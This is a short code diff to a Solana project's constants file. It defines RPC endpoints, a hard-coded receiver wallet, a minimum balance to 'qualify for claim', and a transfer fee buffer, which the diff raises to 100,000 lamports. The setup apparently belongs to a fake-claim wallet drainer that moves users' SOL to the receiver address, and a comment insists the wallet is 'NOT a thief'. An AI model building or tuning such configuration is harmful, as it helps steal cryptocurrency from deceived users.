@@ -12,8 +12,9 @@ export const RPC_ENDPOINTS = [
 // 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
 export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');
 
-// Optional: Minimum balance buffer (in lamports)
-export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL
+// Fee buffer in lamports — covers base fee (5000) + priority fees the wallet
+// may add via ComputeBudget instructions.  100k lamports = 0.0001 SOL.
+export const TRANSFER_FEE_BUFFER = 100_000;
 
 // Minimum SOL balance required to qualify for claim
 export const MIN_QUALIFY_SOL = 0.01;
